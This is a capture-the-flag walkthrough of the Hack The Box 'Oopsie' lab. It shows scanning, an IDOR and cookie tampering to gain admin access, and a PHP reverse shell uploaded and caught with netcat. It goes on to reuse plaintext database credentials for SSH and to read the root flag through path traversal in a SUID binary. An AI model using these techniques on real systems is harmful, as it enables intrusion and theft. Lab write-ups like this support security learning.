# Oopsie

URL: https://app.hackthebox.com/starting-point

Level: Very Easy

Start time: 17 Feb 2022, 6:12pm GMT+1

End time: 18 Feb 2022, 11:22am GMT+1


## Walkthrough

### Enumeration

#### NMAP

Basic nmap scan:

```
# Nmap 7.92 scan initiated Thu Feb 17 18:12:12 2022 as: nmap -T4 -p- -oN 01_nmap 10.129.92.157
Nmap scan report for 10.129.92.157
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Thu Feb 17 18:12:27 2022 -- 1 IP address (1 host up) scanned in 15.47 seconds
```

Again with -sC and -sV:

```
# Nmap 7.92 scan initiated Thu Feb 17 18:12:58 2022 as: nmap -T4 -p22,80 -sC -sV -oN 02_nmap 10.129.92.157
Nmap scan report for 10.129.92.157
Host is up (0.058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 17 18:13:11 2022 -- 1 IP address (1 host up) scanned in 12.49 seconds

```

We reach this website:

![Screenshot_2022-02-18_17-00-41](https://user-images.githubusercontent.com/42389836/154717679-18138dbe-d7b0-49e1-b783-0ba8eae17966.png)

At first glance, nothing interesting with `gobuster`:

```
gobuster dir -u http://10.129.92.157 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o 03_gobuster
/images               (Status: 301) [Size: 315] [--> http://10.129.92.157/images/]
/themes               (Status: 301) [Size: 315] [--> http://10.129.92.157/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.92.157/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.92.157/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.92.157/js/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.92.157/fonts/]
```

Let's try with `-r` option ("--follow-redirect"):

```
e# gobuster dir -u http://10.129.95.191 -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o 03_gobuster_better
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.191
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2022/02/18 12:32:59 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 403) [Size: 278]
/themes               (Status: 403) [Size: 278]
/uploads              (Status: 403) [Size: 278]
/css                  (Status: 403) [Size: 278]
/js                   (Status: 403) [Size: 278]
/fonts                (Status: 403) [Size: 278]

===============================================================
2022/02/18 12:44:57 Finished
===============================================================
```

We got several "forbidden" pages. Maybe some authentication is required.

Let's look at HTML source code. We found something interesting:

```
//# sourceURL=pen.js
    </script>
<script src="/cdn-cgi/login/script.js"></script>
<script src="/js/index.js"></script>
</body>
</html>
```

We got a simple login page:

![Screenshot_2022-02-17_18-27-51](https://user-images.githubusercontent.com/42389836/154718575-fb9325b5-0e77-469d-affb-027581dc8473.png)

We click on "login as guest":

![Screenshot_2022-02-18_10-40-32](https://user-images.githubusercontent.com/42389836/154718734-50eacfc5-3abc-40ae-b4e4-08766f9f9cad.png)

We notice that we are unable to access "upload" page:

![Screenshot_2022-02-18_10-40-54](https://user-images.githubusercontent.com/42389836/154718881-f45c8dbb-005a-421b-aaec-31a9d7fbe297.png)


Let's look our web request in mode detail:

```
GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1

Host: 10.129.95.191

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: user=2233; role=guest

Upgrade-Insecure-Requests: 1
```

We can try a simple edit on our cookike (through "Cookie Quick Manager" Firefox plugin):

![cookie](https://user-images.githubusercontent.com/42389836/154719695-90549272-bec6-4dc5-86b7-8340867a3723.JPG)

But this didn't work.

Let's explore our backend as "guest" user.

We click on "accounts" page and we found that our id is 2233:

![Screenshot_2022-02-18_10-42-21](https://user-images.githubusercontent.com/42389836/154720006-80f892c7-8b03-4571-8e9a-50b701a2281b.png)

Let's change `id` parameter on URL:

http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1#

![Screenshot_2022-02-18_10-42-43](https://user-images.githubusercontent.com/42389836/154720949-ec19868f-80cd-4948-bb6a-86261724bfae.png)

We found that admin is is actually `34322`.

So, we edit again our cookie with `user: 34322` and `role: admin` and finally we gain access to upload page:

![Screenshot_2022-02-18_11-00-19](https://user-images.githubusercontent.com/42389836/154721308-507999d7-5ff5-4ce5-9148-88e4c1b9e572.png)

We try to upload PHP reverse shell from Pentestmonkey (https://github.com/pentestmonkey/php-reverse-shell) and it works!

![Screenshot_2022-02-18_11-03-01](https://user-images.githubusercontent.com/42389836/154721867-b1865e09-28fb-4c36-8cde-2608773c8622.png)

At this point, we run netcat and we start listening:

```
root@kaligra:/opt/htb-startingpoint/Oopsie# nc -nlvp 4444
listening on [any] 4444 ...
```

We browse to http://10.129.95.191/uploads/shell.php and we receive our shell:

```
root@kaligra:~# curl http://10.129.95.191/uploads/shell.php
```

```
connect to [10.10.16.44] from (UNKNOWN) [10.129.95.191] 41776
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:14:06 up 53 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

We explore /var/www/html folder and we grab `db.php` file:

```
$ pwd
/
$ cd /var/www/html
$ ls
cdn-cgi
css
fonts
images
index.php
js
themes
uploads
$ cd cdn-cgi
$ ls
login
$ cd login
$ ls
admin.php
db.php
index.php
script.js
$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
$
```

Since user `robert` is also present on `passwd` file, we try SSH access, and we are able to login:

```
root@kaligra:/opt/htb-startingpoint/Oopsie# ssh robert@10.129.95.191
The authenticity of host '10.129.95.191 (10.129.95.191)' can't be established.
ED25519 key fingerprint is SHA256:IzSXDs9dqcYA25jc85qIroMg43bjBJ8DEbPHmAEr8Nc.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.95.191' (ED25519) to the list of known hosts.
robert@10.129.95.191's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb 18 10:22:44 UTC 2022

  System load:  0.0               Processes:             116
  Usage of /:   40.5% of 6.76GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.129.95.191
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

275 packages can be updated.
222 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Jan 25 10:20:16 2020 from 172.16.118.129
robert@oopsie:~$
```

From there, we can grab user flag.

We also try some basic privesc techniques:

```
robert@oopsie:~$ crontab -l
no crontab for robert
robert@oopsie:~$ sudo -l
[sudo] password for robert:
Sorry, user robert may not run sudo on oopsie.
```

### Privesc

We look for SUID files:

```
robert@oopsie:~$ find / -type f -perm -4000 2>/dev/null
/snap/core/11420/bin/mount
/snap/core/11420/bin/ping
/snap/core/11420/bin/ping6
/snap/core/11420/bin/su
/snap/core/11420/bin/umount
/snap/core/11420/usr/bin/chfn
/snap/core/11420/usr/bin/chsh
/snap/core/11420/usr/bin/gpasswd
/snap/core/11420/usr/bin/newgrp
/snap/core/11420/usr/bin/passwd
/snap/core/11420/usr/bin/sudo
/snap/core/11420/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11420/usr/lib/openssh/ssh-keysign
/snap/core/11420/usr/lib/snapd/snap-confine
/snap/core/11420/usr/sbin/pppd
/snap/core/11743/bin/mount
/snap/core/11743/bin/ping
/snap/core/11743/bin/ping6
/snap/core/11743/bin/su
/snap/core/11743/bin/umount
/snap/core/11743/usr/bin/chfn
/snap/core/11743/usr/bin/chsh
/snap/core/11743/usr/bin/gpasswd
/snap/core/11743/usr/bin/newgrp
/snap/core/11743/usr/bin/passwd
/snap/core/11743/usr/bin/sudo
/snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11743/usr/lib/openssh/ssh-keysign
/snap/core/11743/usr/lib/snapd/snap-confine
/snap/core/11743/usr/sbin/pppd
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/at
/usr/bin/bugtracker
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
```

Let's focus on `bugtracker` binary-

That tool is asking us for an ID: we type `1000` and we notice that it try to display `/root/reports/1000`.

```
robert@oopsie:~$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1000
---------------

cat: /root/reports/1000: No such file or directory

```

We can "inject" that tool to display another file, eg:

```
robert@oopsie:~$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../root.txt
---------------

af13b0bee69f8a877c3faf667f7beacf
```


